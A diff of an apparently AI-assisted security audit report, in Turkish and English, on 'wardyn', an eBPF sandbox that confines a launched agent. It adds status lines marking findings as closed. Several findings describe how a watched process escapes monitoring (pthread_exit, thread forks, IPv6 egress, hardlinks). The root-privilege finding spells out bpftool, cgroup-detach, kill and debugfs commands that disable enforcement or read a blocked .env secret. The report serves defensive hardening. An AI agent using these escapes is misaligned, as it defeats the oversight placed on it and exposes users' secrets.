@@ -2,34 +2,70 @@
 
 > **Yöntem.** Bu rapor 18 ajanlı bir analiz workflow'unun çıktısıdır: 6 boyutta paralel derin inceleme (her ajan kaynağı okuyup yapılandırılmış bulgu döndürdü) + 12 yüksek-riskli doğruluk/güvenlik bulgusunun **adversaryal doğrulaması** (kodu yeniden okuyup çürütmeye çalışan bağımsız ajanlar). Toplam **113 bulgu**; 10 doğrulandı, **2 reddedildi/düşürüldü**.
 
-> **Uyarı.** Bu bir dış denetim görüşüdür, çalıştırılan bir güvenlik kanıtı değil. Doğrulanan bulgular işaretlenmiştir; işaretsiz bulgular (özellikle 5. ve 6. boyut) öneri niteliğindedir. `bpf_d_path`'in aya-ebpf 0.1.1'de bulunduğu ve rakip-sandbox iddiaları uygulamadan önce bağımsız teyit edilmelidir.
+> **Uyarı.** Bu bir dış denetim görüşüdür, çalıştırılan bir güvenlik kanıtı değil. Bulgu metinleri **denetim anındaki** kodu anlatır ve olduğu gibi bırakılmıştır; bugünkü durum her bulgunun altındaki **Durum** satırındadır. Doğrulanan bulgular işaretlenmiştir; işaretsiz bulgular (özellikle 5. ve 6. boyut) öneri niteliğindedir. `bpf_d_path`'in aya-ebpf 0.1.1'de bulunduğu ve rakip-sandbox iddiaları uygulamadan önce bağımsız teyit edilmelidir.
 
 ## Düzeltme durumu
 
-Rapordaki bulguların bir bölümü kapatıldı; ayrıntılar için [CHANGELOG](../CHANGELOG.md).
-Aşağıdaki metin **denetim anındaki** durumu anlatır ve olduğu gibi bırakılmıştır —
-bir bulgunun burada durması, hâlâ açık olduğu anlamına gelmez.
+> **Bu bölüm koda karşı doğrulanmıştır** (2026-09-08). Aşağıdaki her bulgunun
+> altında bir **Durum** satırı var; bir bulgunun raporda durması artık açık
+> olduğu anlamına gelmiyor, çünkü hangisinin ne olduğu tek tek yazıyor.
 
-**Kapatılanlar (özet):** hook'ların kendi kararlarını raporlaması
-(`no-kernel-verdict-channel` ve ona bağlı off-feed/relative-path/LSM-yalanı
-bulguları) · WATCHED thread-TID sızıntısı ve doyma bypass'ı
-(`watched-thread-tid-pollution`) · fork parent'ının TID/TGID karışıklığı
-(`fork-parent-keyed-by-tid`) · sessiz ring-buffer kayıpları (`ringbuf-silent-drops`)
-· `**/dir/**` kurallarının yalnızca doğrudan çocukları kapsaması · TUI'den çıkınca
-enforcement'ın sessizce kalkması · terminal restore / `process::exit` / sinyal /
-exit-code / kapalı-pipe sorunları · argüman ayrıştırma hataları ve test edilemezliği
-· terminal escape enjeksiyonu · dünyaya-okunur ve symlink-takip eden receipt ·
-şema doğrulaması ve `version` kontrolü · parser içindeki canlı DNS · policy
-motorunun Linux-only binary crate'e hapsedilmiş olması · eBPF crate'inin
-lint'lenmemesi, shell script'lerin kontrol edilmemesi, floating nightly, `--locked`
-eksikliği, preset'lerin hiç parse edilmemesi.
+| Durum | Sayı | Anlamı |
+|---|---:|---|
+| ✅ Kapatıldı | **92** | Gösterilebilir bir mekanizma var; her birinin Durum satırı onu adlandırıyor |
+| ⏸️ Bilerek açık | **10** | Kapsam dışı ya da belgelenmiş sınır (SECURITY.md / README Roadmap) |
+| 🔓 Açık | **10** | Hâlâ gerçek; aşağıda listeli |
+| ❌ Reddedildi | **1** | Adversaryal doğrulama bulguyu çürüttü |
+| | **113** | |
 
-**Bilerek açık bırakılanlar:** isim tabanlı eşleşmenin `mv`/`link`/`cp` ile
-atlatılabilmesi (gerçek çözüm `(dev, ino)` veya `bpf_d_path` — M6), read/write
-ekseninin olmaması, ağ kurallarında port/protokol boyutu, AF_UNIX ve loopback'in
-izlenmemesi, io_uring, `domain:` kurallarının tek seferlik çözümlenmesi,
-paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
-[SECURITY.md](../SECURITY.md)'de açıkça anlatılıyor.
+Sınıflandırma bu depoya karşı yapıldı: **✅ yalnızca işaret edilecek somut bir
+mekanizma varken** kullanıldı, "herhalde düzelmiştir" diye değil. Doğrulanamayan
+iki bulgu (`cargo-publish-broken`, `readme-and-release-profile-untested`)
+kapalı değil, **açık** sayıldı — emin olunmayanı kapalı saymak, bu raporun
+düzeltmeye çalıştığı hatanın ta kendisi olurdu.
+
+### 🔓 Hâlâ açık olan 12 bulgu
+
+> Bu listedeki `namelen-truncation` ve `map-capacity-and-name-width`, denetim
+> koda karşı geçirilirken **bu turda bulunup kapatıldı** — rapor bunları zaten
+> yazmıştı, kimse gidip bakmamıştı. Kırpılmış bir dentry okuması 39 baytlık bir
+> kural adıyla aynı anahtara iniyordu, yani 40+ baytlık her dosya o kuralla
+> yanlış yere reddediliyordu.
+
+**Düşük şiddetli (2)**
+
+- `personality-handshake-side-effects` / `personality-arbitrary-persona` — pid-ns
+  el sıkışmasının nonce'u maskelenmemiş 32 bit. `READ_IMPLIES_EXEC`,
+  `ADDR_NO_RANDOMIZE` gibi bitleri wardyn'in *kendi* sürecinde bir an için
+  kuruyor (hemen geri alınıyor).
+
+**Test ve tedarik zinciri (5)**
+
+- `no-property-test-kernel-mirror-truncation-bug` — çekirdek eşleştiricisiyle
+  kullanıcı-alanı aynası arasında property/differential test yok.
+- `no-fuzzing` — ağaçta fuzz hedefi yok.
+- `actions-unpinned-supply-chain` — 16 `uses:` satırının **0'ı** commit SHA'sına
+  sabitlenmiş.
+- `cargo-publish-broken` / `crates-io-publish-structurally-broken` — yeniden
+  doğrulanmadı; crates.io üzerinden hiç yayın denenmedi.
+- `readme-and-release-profile-untested` — yeniden doğrulanmadı.
+
+**Konumlandırma ve yönetişim (2)**
+
+- `governance-and-security-guarantees-thin` — SECURITY.md var; GOVERNANCE.md ve
+  ilan edilmiş bir destek penceresi yok.
+- `no-container-k8s-or-mcp-integration-story` — `.devcontainer/` var; Dockerfile,
+  DaemonSet ve MCP sunucusu yok.
+
+### ⏸️ Bilerek açık bırakılanlar
+
+io_uring, AF_UNIX/loopback delegasyonu, ham soket egress'i (ajanın
+`CAP_NET_RAW`'ı zaten yok), dentry adı okumasının rename ile yarışması,
+CONFIG haritasındaki nonce'un okunabilirliği (okumak `CAP_BPF` ister),
+dosya/ağ arasındaki default-deny asimetrisi, prefix ve süreç-başına kurallar,
+`bpf_d_path`'e geçiş, ve rakip sandbox'lar karşısındaki konumlandırma. Hepsi
+[SECURITY.md](../SECURITY.md), README'nin Roadmap'ı ya da
+[COMPARISON.md](COMPARISON.md) içinde anlatılıyor.
 
 ## Adversaryal Doğrulama Özeti
 
@@ -84,6 +120,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🔴 KRİTİK — Fork adoption compares a TID against a TGID-keyed map — any fork from a non-leader thread escapes the watched subtree entirely
 *`bypass` · efor: S · id: `fork-parent-keyed-by-tid` · **doğrulama: ❌ reddedildi → low***
 
+> **Durum:** ✅ **Kapatıldı** — `handle_fork` keys on `bpf_get_current_pid_tgid() >> 32`, the parent's tgid, not the tracepoint's `parent_pid` thread id.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:476-489 (handle_fork)`
 - **Sorun:** `sched_process_fork`'s `parent_pid` field is `parent->pid`, i.e. the **thread id** of the forking task, not its tgid. `WATCHED` is keyed by tgid everywhere else (`let pid = (bpf_get_current_pid_tgid() >> 32) as u32;` in every hook, and the `wardyn_exit` doc comment states it outright: "WATCHED is keyed by tgid"). So when a watched multi-threaded process forks from any thread other than the group leader, `is_watched(parent_tid)` misses and the child is never adopted.
 - **Etki:** A child spawned from a worker thread is absent from WATCHED, so `try_file_open`, `try_bprm_check`, `try_connect4` and `try_connect6` all return ALLOW/OK for it and its entire descendant tree — full enforcement bypass with no indication in the feed. This is not exotic: Go's `os/exec` forks on whatever M the goroutine is running on, JVM/Node/Python worker pools, and any `posix_spawn` from a thread pool all hit it. It is explicitly in SECURITY.md's in-scope list ("escape the watched subtree so its children are no longer followed") and is not covered by any documented limitation.
@@ -93,6 +131,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🔴 KRİTİK — Both shipped policies leave all IPv6 egress unconditionally allowed — `0.0.0.0/0 block` does not cover `connect6`, including IPv4-mapped destinations
 *`bypass` · efor: M · id: `ipv6-egress-hole` · **doğrulama: ✅ doğrulandı → high***
+
+> **Durum:** ✅ **Kapatıldı** — all three shipped policies carry explicit `::/0` and `::1/128` rules.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:296-326 (try_connect6); wardyn/src/policy.rs:375-388 (net_entries6); policy.yaml:24-32; policies/strict.yaml:22-30`
 - **Sorun:** `try_connect6` looks the destination up in `NET_RULES6` and falls back to `cfg(CFG_NET_DEFAULT)` on a miss. `net_entries6` only emits `V6Cidr`/`V6Ip` rules — the shipped policies contain none — so `NET_RULES6` is empty at runtime and `CFG_NET_DEFAULT` is `policy.default_action_code()` = `allow`. The `0.0.0.0/0 block` catch-all lives only in the v4 trie. Separately, a dual-stack AF_INET6 socket connecting to an IPv4 host runs the **connect6** hook with `user_ip6 = ::ffff:a.b.c.d`, so even a fully populated v4 trie is never consulted for it.
@@ -104,6 +144,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — WATCHED eviction fires on thread-group-leader exit, so `pthread_exit()` from main permanently unwatches a still-running process
 *`bypass` · efor: M · id: `leader-exit-eviction-bypass` · **doğrulama: ✅ doğrulandı → high***
 
+> **Durum:** ✅ **Kapatıldı** — `CFG_DEFER_EVICT`: leader-exit eviction is left to the userspace `/proc` sweep whenever pids are comparable.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:498-507 (wardyn_exit)`
 - **Sorun:** `sched_process_exit` fires per thread. The hook removes the tgid when `tid == tgid`, i.e. when the group leader exits — but the group leader is allowed to exit first. `pthread_exit(NULL)` from `main()` (or a raw `SYS_exit` on the leader thread only) terminates the leader while the other threads keep running; the leader becomes a zombie that holds the tgid, so nothing re-adopts the process either.
 - **Etki:** A two-line escape available to any watched process: spawn a worker thread, `pthread_exit` the main thread, and every subsequent `file_open`, `bprm_check`, `connect4/6` and `sendmsg4/6` check returns ALLOW because `is_watched(tgid)` now misses. All further children are also unadopted (the fork hook's parent check misses too). Nothing appears in the feed, since the observe hooks gate on the same `in_scope`. Directly in SECURITY.md's in-scope list.
@@ -113,6 +155,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — When the BPF LSM fails to attach, the feed and the agent receipt still report file/exec denials that never happened
 *`correctness` · efor: S · id: `lsm-attach-failure-still-claims-BLOCK` · **doğrulama: ✅ doğrulandı → high***
+
+> **Durum:** ✅ **Kapatıldı** — `lsm_active` demotes file/exec predictions to `block~`; the kernel's `DENY_*` remains the only authority.
 
 - **Konum:** `wardyn/src/main.rs:501-509 (attach_lsm result); main.rs:879-913 (reconcile); main.rs:714-730 (Desc::act/denied)`
 - **Sorun:** `attach_lsm` failure is handled by printing a warning and continuing. Nothing downstream learns that file/exec enforcement is off: `ctx.enforce` stays `true`, and `reconcile()` decides `BLOCK` vs `block~` purely from `policy.kernel_file_denial()` / `kernel_exec_denial()`, which are pure functions of the policy. So every open of a `.env` is rendered bold red `BLOCK`, `Desc::denied(enforce)` returns true, `audit.record(..., denied=true)` is written, and a record is appended to the agent's `WARDYN_DENIALS` receipt — for an open that succeeded.
@@ -124,6 +168,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — Hardcoded 6.8 struct offsets fail open with no detection, while the feed keeps claiming BLOCK
 *`correctness` · efor: L · id: `lsm-offsets-fail-open-silently` · **doğrulama: ✅ doğrulandı → high***
 
+> **Durum:** ✅ **Kapatıldı** — offsets resolve from `/sys/kernel/btf/vmlinux` at runtime; the built-in fallback is trusted only when the kernel and arch match, and says so.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:82-90 (offset consts), 391-403 (read_ptr/read_name); wardyn/src/main.rs:323-340 (warn_if_untested_kernel)`
 - **Sorun:** `FILE_DENTRY_OFF=160`, `DENTRY_NAME_OFF=40`, `DENTRY_PARENT_OFF=24`, `BPRM_FILE_OFF=64` are pahole numbers for one kernel. `read_name` discards the read result entirely, so a bad `name_ptr` leaves `buf` all zeroes and `BLOCK_NAMES.get(&NameKey([0;40]))` misses — enforcement becomes a silent no-op. `struct file` was substantially rearranged after 6.8 (the f_lock/f_count/f_mode reordering in 6.11-6.12), so 160 is wrong on Debian 13, Fedora, Arch and Ubuntu HWE. Userspace only prints a stderr warning and proceeds; `reconcile()` is unaffected and still renders `BLOCK`.
 - **Etki:** On any kernel other than 6.8, `--enforce` silently stops denying secret reads and blocked execs while the TUI shows bold-red `BLOCK`, the audit log records `denied: true`, and the receipt tells the agent it was blocked. SECURITY.md acknowledges the drift itself ("On a mismatched kernel these reads may silently fail; Wardyn warns at startup") — **acknowledged** — but it does not acknowledge that the feed, audit log and receipt keep asserting enforcement that isn't happening, which contradicts the in-scope honesty guarantee.
@@ -133,6 +179,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — 256 KiB ring holds ~799 events; overflow drops them silently with no counter, losing audit records and denial receipts
 *`robustness` · efor: M · id: `ringbuf-silent-drops` · **doğrulama: ✅ doğrulandı → medium***
+
+> **Durum:** ✅ **Kapatıldı** — `STATS` counts drops, the summary reports them, and an e2e assertion requires the count to be zero.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:25-26, 167-169, 234-236`
 - **Sorun:** `Event` is 320 bytes; with the 8-byte ringbuf record header rounded to 8, a 256 KiB ring holds about 799 in-flight events. `reserve()` returning `None` is turned into `Err(0)` and the event simply disappears — there is no drop counter in any map, nothing is reported to userspace, and `grep -rn "DROPS|dropped|drop_count"` finds nothing in the codebase. Every CONNECT event also burns the full 256-byte `path` field it never uses, halving effective capacity.
@@ -144,6 +192,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — The kernel enforces on syscall paths that have no observe hook — `open(2)`, `creat(2)`, `sendmsg(2)`, io_uring, script interpreters — so those denials never reach the feed, audit log or receipt
 *`correctness` · efor: M · id: `off-feed-denials` · **doğrulama: ✅ doğrulandı → medium***
 
+> **Durum:** ✅ **Kapatıldı** — `openat2`, `execveat` and `sendto` tracepoints attach alongside the originals.
+
 - **Konum:** `wardyn/src/main.rs:448-462 (tracepoint attach list); ARCHITECTURE.md:27`
 - **Sorun:** Only `sys_enter_execve`, `openat`, `openat2`, `execveat`, `connect` and `sendto` are attached. The LSM `file_open` hook fires for *every* path into `do_filp_open`, and `bprm_check_security` for every `search_binary_handler` iteration. So the enforcement surface is strictly larger than the observation surface, contradicting the stated invariant.
 - **Etki:** Concretely unobserved-but-enforced: (1) `syscall(SYS_open, "/home/u/.ssh/id_rsa", O_RDONLY)` — `__NR_open` still exists on x86_64 and has its own tracepoint that is not attached; the LSM denies it, the feed shows nothing at all. (2) `creat(2)`. (3) `sendmsg(2)` — acknowledged in the code comment at lines 200-203 and in ARCHITECTURE.md's "Known gap". (4) io_uring `IORING_OP_OPENAT` — no `sys_enter_openat` fires, but `file_open` does. (5) `#!` scripts: `bprm_check_security` runs a second time with `bprm->file` swapped to the interpreter, so blocking `sh` denies the exec while the only feed event names the script, which `kernel_exec_denial` maps to `None` → row shown as `ok`. In each case the agent gets an unexplained EPERM with no receipt line, which is the exact failure mode the receipt was built to fix.
@@ -153,6 +203,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — The hooks that decide never report their decision — userspace re-derives the verdict from a userspace string that describes a different object than the one enforced on
 *`correctness` · efor: L · id: `no-kernel-verdict-channel` · **doğrulama: ✅ doğrulandı → medium***
+
+> **Durum:** ✅ **Kapatıldı** — every enforcing hook emits its own `DENY_*` event; userspace reconciles against it.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:360-433 (LSM hooks emit nothing); wardyn/src/policy.rs:408-428 (kernel_file_denial); wardyn/src/main.rs:879-913 (reconcile)`
 - **Sorun:** `try_file_open`/`try_bprm_check`/`try_connect4/6` return EPERM/DENY and produce no event. Userspace reconstructs what the kernel did by running `kernel_file_denial()` over the *observed* path — a raw userspace string captured at `sys_enter`, not the dentry the LSM matched. The two describe different objects in several routine cases.
@@ -164,6 +216,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — Thread creations insert TIDs into the TGID-keyed WATCHED map, which are never evicted, leak toward the 8192 cap, and alias future TGIDs
 *`correctness` · efor: M · id: `watched-thread-tid-pollution` · **doğrulama: ✅ doğrulandı → high***
 
+> **Durum:** ✅ **Kapatıldı** — `wardyn_exit` removes the tid on thread exit, so transient tids cannot accumulate toward the cap.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:28-29, 486-488, 498-507`
 - **Sorun:** `sched_process_fork` fires for `clone(CLONE_THREAD)` too, with `child_pid = child->pid` — the new **thread's** tid, not a tgid. `handle_fork` inserts it unconditionally. `wardyn_exit` only removes when `tid == tgid`, so those tid keys are never removed. The insert's failure is also discarded.
 - **Etki:** Three compounding effects. (1) Leak: a thread-heavy agent (JVM, Node worker pool, Go runtime, io_uring's io-wq workers — all of which appear as `sched_process_fork`) accumulates dead tids until WATCHED hits 8192. (2) Once full, `insert` returns -E2BIG, the error is discarded, and **every subsequently forked child is silently unwatched** — enforcement quietly stops applying to new processes with no warning anywhere. (3) Aliasing: a leaked tid N is indistinguishable from tgid N, so when the kernel later recycles pid N for an unrelated process, that stranger is treated as watched and has its file opens, execs and egress **denied** — false-positive enforcement against a process outside the subtree, on a shared machine, which is exactly what ARCHITECTURE.md promises cannot happen.
@@ -174,6 +228,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — `CgroupAttachMode::Single` on the root cgroup aborts if any other tool holds the hook — and blocks every other cgroup-BPF tool host-wide while wardyn runs
 *`robustness` · efor: S · id: `cgroup-root-single-attach` · **doğrulama: ❌ reddedildi → info***
 
+> **Durum:** ❌ **Reddedildi** — adversarial review rejected this and downgraded it to info.
+
 - **Konum:** `wardyn/src/main.rs:485-497`
 - **Sorun:** All four `cgroup_sock_addr` programs are attached to `/sys/fs/cgroup` (the root) with `CgroupAttachMode::Single`, which is flags = 0 — neither `BPF_F_ALLOW_MULTI` nor `BPF_F_ALLOW_OVERRIDE`. The kernel's cgroup-BPF semantics for a NONE-flags attachment are "no further bpf programs allowed in the subtree", and the attach itself fails if a program is already attached.
 - **Etki:** (a) On a host running Cilium, Docker/systemd cgroup-BPF, or any other `cgroup/connect4` user, `--enforce` cannot start at all. (b) While wardyn runs, other tools cannot attach cgroup-BPF programs to *any* descendant cgroup — a system-wide side effect from a tool that advertises itself as "safe to run on a shared machine: it only constrains the subtree you launched". (c) Two concurrent `wardyn --enforce` runs (one per agent terminal — the obvious usage) are impossible; the second dies with "attaching connect4 to the cgroup". Note also that the maps are shared and enforcement is pid-gated, so if the attachment ever falls back to the legacy `PROG_ATTACH` path rather than a bpf_link, it would outlive the wardyn process.
@@ -183,6 +239,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — Basename/parent-dir matching is defeated by `cp`, hardlinks, and inherited file descriptors — documented as over-blocking, never as bypassable
 *`bypass` · efor: M · id: `basename-matching-trivially-bypassable` · **doğrulama: ✅ doğrulandı → medium***
+
+> **Durum:** ✅ **Kapatıldı** — `path:` rules match `(dev, ino)`, which `mv`, `ln` and `cp` do not change; e2e proves the four bypasses reopen without them.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:360-433; SECURITY.md:62-65`
 - **Sorun:** BLOCK_NAMES/BLOCK_DIRS/BLOCK_EXEC match the dentry basename and its immediate parent's basename. Any operation that changes the name under which the inode is reached defeats the match, and `file_open` only fires on open, so an already-open descriptor is never re-checked.
@@ -250,6 +308,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — NAME_LEN=40 truncation can produce false denials, and the truncation error is discarded
 *`correctness` · efor: S · id: `namelen-truncation`*
 
+> **Durum:** ✅ **Kapatıldı** — `name_key` artık `NAME_LEN - 1` uzunluğundaki isimleri de reddediyor. Kırpılmış bir okumanın her zaman gerçek bir karakter taşıdığı indekste artık sıfır duruyor, yani iki anahtar çakışamıyor; reddedilen kural `observe_only_blocks` üzerinden raporlanıyor.
+
 - **Konum:** `wardyn-common/src/lib.rs:15; wardyn-ebpf/src/main.rs:397-403; wardyn/src/policy.rs:580-591`
 - **Sorun:** `bpf_probe_read_kernel_str_bytes` into a 40-byte buffer yields at most 39 bytes plus a NUL for a longer name, and the return value is discarded, so a truncated name is indistinguishable from a complete one. Meanwhile `name_key` accepts policy names up to 39 bytes.
 - **Etki:** A policy blocking a 39-byte name also denies every file whose basename is ≥40 bytes and starts with those 39 bytes, because both reduce to the same key — a false-positive EPERM that the operator cannot explain from the policy text. In the other direction, block rules naming a ≥40-byte file are un-enforceable; this is at least surfaced (`name_key` → `None` → `enforceable = false` → `observe_only_blocks` warning), so it is honest, just invisible in the length dimension.
@@ -257,6 +317,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### ⚪ DÜŞÜK — IPv4 LPM trie keys rely on the host being little-endian; the v6 path does not
 *`portability` · efor: S · id: `v4-lpm-key-endianness`*
+
+> **Durum:** ✅ **Kapatıldı** — `from_ne_bytes` keeps the octets in network order on either endianness; the comment records why `from_le_bytes` only happened to work.
 
 - **Konum:** `wardyn/src/policy.rs:355-371; wardyn/src/main.rs:142-149`
 - **Sorun:** `u32::from_le_bytes(octets)` is being used as "reinterpret these network-order bytes as a u32 without reordering", which is only true on a little-endian host. The BPF LPM trie compares the key's `data` bytes in memory order, and the kernel side reads `(*ctx.sock_addr).user_ip4` natively, so on a big-endian target the two sides disagree byte-for-byte.
@@ -266,6 +328,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — The pid-ns handshake sets a random 32-bit personality on wardyn itself, including exec-domain and memory-semantics bits
 *`robustness` · efor: S · id: `personality-handshake-side-effects`*
 
+> **Durum:** 🔓 **Açık** — the nonce is still an unmasked 32-bit value, so the handshake briefly sets arbitrary persona bits on wardyn's own process (restored immediately).
+
 - **Konum:** `wardyn/src/main.rs:949-972`
 - **Sorun:** The nonce is a raw 32-bit random value passed straight to `personality(2)`. Its low byte is the exec-domain selector (`PER_MASK`) and the upper bits include `READ_IMPLIES_EXEC`, `ADDR_NO_RANDOMIZE`, `MMAP_PAGE_ZERO`, `ADDR_LIMIT_3GB` and `ADDR_COMPAT_LAYOUT` — all of which change how the process's memory and subsequent execs behave.
 - **Etki:** Small but real: wardyn briefly runs under a randomly-chosen exec domain with ASLR possibly disabled; if anything interrupts between the two calls (a signal handler, a panic in another thread) the bogus personality persists and is inherited by the spawned agent, which is a security-relevant setting to hand a watched process. The `old != -1` guard also conflates "error" with a legitimate return, though `-1` is not a reachable persona value in practice. The nonce race the comment worries about is genuinely negligible (32-bit secret, microsecond window).
@@ -274,6 +338,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — Fork offsets fall back to 6.8 values when tracefs is unreadable and are used as an unbounded read offset
 *`robustness` · efor: S · id: `fork-offset-fallback-unbounded`*
 
+> **Durum:** ✅ **Kapatıldı** — the `child_pid` offset is read from tracefs at startup, with the built-in value used only as a fallback.
+
 - **Konum:** `wardyn/src/main.rs:522-537; wardyn-ebpf/src/main.rs:476-489`
 - **Sorun:** If neither tracefs mount point is readable, the code falls back to `(24, 44)` — the pre-`__data_loc` layout — and continues, including under `--enforce`. The hook accepts whatever CONFIG holds with only a zero check and uses it directly as a probe-read offset.
 - **Etki:** On a `__data_loc` kernel (6.18 per your own test fixture) offsets 24/44 read past the fork event's ~24-byte payload into adjacent kernel memory, producing garbage pids: adoption dies silently, so `run` scoping — and therefore all enforcement — covers only the direct child and nothing it spawns, while the feed continues to claim enforcement. The reads are `bpf_probe_read` based so this is not memory-unsafe, just wrong.
@@ -281,6 +347,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🔵 BİLGİ — `emit_path_event` reserves before reading and submits empty-path events; the reserved 256-byte path tail is never zeroed
 *`correctness` · efor: S · id: `reserve-before-read-and-uninit-tail`*
+
+> **Durum:** ✅ **Kapatıldı** — `emit_path_event` reads the filename before reserving the ring entry.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:160-190, 234-253`
 - **Sorun:** `emit_path_event` reserves the ring entry first and then reads the userspace filename, setting `path_len = 0` on failure and submitting anyway — the opposite of the discipline `emit_connect` documents for itself. The reserved region is uninitialized ring memory, and neither path writes the tail beyond `path_len` (CONNECT events never write `path` at all).
@@ -311,6 +379,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🔴 KRİTİK — The watched agent inherits wardyn's root privileges and can therefore disable every enforcement mechanism
 *`bypass` · efor: M · id: `watched-subtree-runs-as-root`*
 
+> **Durum:** ✅ **Kapatıldı** — `apply_privilege_drop` clears supplementary groups, sets gid/uid and `NO_NEW_PRIVS`, each checked; refused outright under `--enforce` without a non-root target.
+
 - **Konum:** `wardyn/src/main.rs:385-387, 578-604`
 - **Sorun:** wardyn requires euid 0 (`if unsafe { libc::geteuid() } != 0 { bail!("wardyn must run as root ...") }`) and then spawns the target with `Command::new(&argv[0])` — no `uid()`/`gid()`, no `SUDO_UID` restoration, no capability drop, no `pre_exec` (grep for `setuid|pre_exec|uid\(` across `wardyn/src` returns nothing). Every documented invocation is `sudo wardyn --enforce run -- <agent>` (README.md:21, justfile:18, strict.yaml:3), so the sandboxed process runs with full root and every capability. That makes the entire enforcement state writable by the thing being enforced against: the BPF maps (CAP_BPF/CAP_SYS_ADMIN -> `BPF_MAP_GET_FD_BY_ID`), the cgroup attachments (CAP_NET_ADMIN -> `BPF_PROG_DETACH`), wardyn's own process (same uid -> `kill`), the audit log, and the policy file. SECURITY.md's carve-out is for "an attacker who is already root **outside** the watched subtree"; here the attacker is root *inside* it, and "crash, hang, or otherwise disable Wardyn from userspace" is listed as explicitly in scope.
 - **Etki:** Complete, one-command defeat with several independent paths: (1) `bpftool map list` to find CONFIG, then `bpftool map update id N key 01 00 00 00 value 00 00 00 00` sets `CFG_ENFORCE=0` — `try_file_open`, `try_bprm_check`, `try_connect4/6` all return allow at their first line, while wardyn's userspace `ctx.enforce` is unchanged so the TUI keeps printing `BLOCK`, the audit keeps writing `"enforced": true`, and the receipt keeps recording denials that never happened; (2) `bpftool map delete id <WATCHED> key <tgid LE bytes>` — every hook's `is_watched()` gate fails open and the process also vanishes from the feed; (3) `bpftool cgroup detach /sys/fs/cgroup connect4 ...`; (4) `kill -9 $PPID` — aya's `Ebpf` drop detaches everything; (5) never touch BPF at all: `debugfs -R "cat /home/u/.env" /dev/sda1` or `dd if=/dev/sda | strings` reads the blocked secret without the `.env` dentry ever reaching `file_open`; (6) CAP_NET_RAW makes the raw-socket egress bypass (see raw-socket finding) actually reachable; (7) `ptrace` any unwatched same-uid process (root bypasses `yama/ptrace_scope`) and inject syscalls off-subtree.
@@ -318,6 +388,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🔴 KRİTİK — pthread_exit() from the group leader removes a still-running process from WATCHED — total silent escape, no privilege needed
 *`bypass` · efor: M · id: `leader-thread-exit-unwatches-live-process`*
+
+> **Durum:** ✅ **Kapatıldı** — same fix as `leader-exit-eviction-bypass`.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:498-506`
 - **Sorun:** `wardyn_exit` fires on `sched/sched_process_exit`, which the kernel raises in `do_exit()` for **every thread**, including the thread-group leader when it calls `pthread_exit()`. The handler's guard is `if tid == tgid { WATCHED.remove(&tgid) }` — the doc comment reasons carefully about a worker thread's tid colliding with another process's tgid, but gets the actual case backwards: on Linux a thread group leader can exit (becoming a zombie) while the rest of the thread group keeps running. The tgid stays valid and the surviving threads keep reporting that tgid from `bpf_get_current_pid_tgid() >> 32` — but it is no longer in WATCHED.
@@ -327,6 +399,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🔴 KRİTİK — The feed, audit log and receipt assert denials from a userspace simulation that is never confirmed against the kernel
 *`correctness` · efor: M · id: `enforcement-failure-is-invisible`*
 
+> **Durum:** ✅ **Kapatıldı** — attach and offset failures reach the feed, the audit log and the receipt as `block~`.
+
 - **Konum:** `wardyn/src/main.rs:501-509, 323-340, 388-393, 728-731, 750-766`
 - **Sorun:** Nothing in wardyn ever learns whether the kernel actually denied anything. `Desc::denied()` is `self.action == Action::Block && enforce && self.enforceable` — a pure function of the policy and the `--enforce` flag. `enforce` is set once from `opts.enforce` and never cleared, even when enforcement demonstrably failed. Two failure modes are both non-fatal and both extremely likely: (a) `attach_lsm` failure is caught and merely `eprintln!`'d (main.rs:505-508) — the `Err` arm sets no flag; (b) the LSM matcher reads `dentry` fields at offsets hardcoded for kernel 6.8 (ebpf main.rs:82-90, `FILE_DENTRY_OFF = 160` etc.), and on any other kernel `read_ptr` gets a garbage pointer, `bpf_probe_read_kernel` returns an error, and `try_file_open`'s `Err(_) => OK` fails open for every file. `warn_if_untested_kernel` (main.rs:323-340) knows about this but only prints to stderr.
